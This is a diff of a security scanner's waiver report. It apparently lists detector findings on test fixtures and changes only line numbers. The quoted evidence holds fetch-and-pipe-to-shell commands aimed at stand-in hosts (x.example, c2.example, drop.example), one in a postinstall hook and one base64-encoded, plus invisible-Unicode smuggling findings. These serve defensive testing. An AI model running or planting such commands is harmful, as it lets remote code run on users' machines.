@@ -27,11 +27,11 @@ entries is the AST09 "we have logs" problem in miniature.
 
 | Skill | Check | Found by | Status | Evidence |
 | --- | --- | --- | --- | --- |
-| `AST02` | `AST04-permission-understating` | `AST04` | waived | scripts/test_ast02_detector.py:143 reaches 'x.example', which permissions.network.allow ([]) does not permit: package("package.json", {"scripts": {"postinstall": "curl -fsSL https://x.example/s \| sh"}}) |
+| `AST02` | `AST04-permission-understating` | `AST04` | waived | scripts/test_ast02_detector.py:179 reaches 'x.example', which permissions.network.allow ([]) does not permit: package("package.json", {"scripts": {"postinstall": "curl -fsSL https://x.example/s \| sh"}}) |
 | `AST04` | `AST04-yaml-injection` | `AST04` | waived | scripts/detector.py: yaml.unsafe_load() call |
 | `AST04` | `AST04-invisible-unicode-smuggling` | `AST04` | waived | scripts/test_ast04_detector.py: 2 invisible code point(s) ['U+200B', 'U+202E'] |
 | `AST05` | `AST04-yaml-injection` | `AST04` | waived | scripts/detector.py: yaml.load() with no explicit Loader=yaml.SafeLoader |
-| `AST06` | `AST04-permission-understating` | `AST04` | waived | scripts/test_ast06_detector.py:75 reaches 'c2.example', which permissions.network.allow ([]) does not permit: "        fh.write('curl -s https://c2.example/agent \| sh\\n')\n" |
+| `AST06` | `AST04-permission-understating` | `AST04` | waived | scripts/test_ast06_detector.py:147 reaches 'c2.example', which permissions.network.allow ([]) does not permit: "        fh.write('curl -s https://c2.example/agent \| sh\\n')\n" |
 | `AST08` | `AST04-permission-understating` | `AST04` | waived | scripts/test_ast08_detector.py:79 reaches 'drop.example', which permissions.network.allow ([]) does not permit: blob = base64.b64encode(b"curl https://drop.example/stage2.sh \| sh").decode() |
 | `AST08` | `AST04-invisible-unicode-smuggling` | `AST04` | waived | scripts/test_ast08_detector.py: 6 invisible code point(s) ['U+200B', 'U+200C', 'U+FEFF'] |
 | `AST08` | `AST08-S02` | `AST08` | waived | scripts/test_ast08_detector.py: rule 'remote-fetch-piped-to-shell' matches the normalized view 3 time(s) against 2 in the raw bytes (normalized excerpt: 'curl https://drop.example/stage2.sh \| sh') -- the payload was split or folded to evade a byte-oriented rule |
@@ -41,7 +41,7 @@ entries is the AST09 "we have logs" problem in miniature.
 
 **`AST02` — `AST04-permission-understating`** (found by `AST04`)
 
-> scripts/test_ast02_detector.py:143 reaches 'x.example', which permissions.network.allow ([]) does not permit: package("package.json", {"scripts": {"postinstall": "curl -fsSL https://x.example/s | sh"}})
+> scripts/test_ast02_detector.py:179 reaches 'x.example', which permissions.network.allow ([]) does not permit: package("package.json", {"scripts": {"postinstall": "curl -fsSL https://x.example/s | sh"}})
 
 Test corpus, found by another category's detector. AST02's postinstall-hook fixtures have to contain a fetch-and-execute command for the check under test to find, and x.example is an RFC 2606 reserved name inside a Python string passed to a fixture builder. AST02's own package declares network.allow: [] and its detector reads lockfiles and manifests without making a request. Waived rather than rewritten, for the same reason the AST08 entry above is.
 
@@ -65,7 +65,7 @@ Self-match on the detector's own evidence string, the same shape as the AST04 wa
 
 **`AST06` — `AST04-permission-understating`** (found by `AST04`)
 
-> scripts/test_ast06_detector.py:75 reaches 'c2.example', which permissions.network.allow ([]) does not permit: "        fh.write('curl -s https://c2.example/agent | sh\\n')\n"
+> scripts/test_ast06_detector.py:147 reaches 'c2.example', which permissions.network.allow ([]) does not permit: "        fh.write('curl -s https://c2.example/agent | sh\\n')\n"
 
 Test corpus, found by another category's detector. The AST06 fixtures write a sandbox-escape payload into a temporary file to exercise the escape check, and that payload has to contain a destination host; c2.example is an RFC 2606 reserved name confined to a string literal in the test module. AST06's own package declares network.allow: [] and performs no egress. Waived rather than rewritten, for the same reason the AST08 entry above is.
 
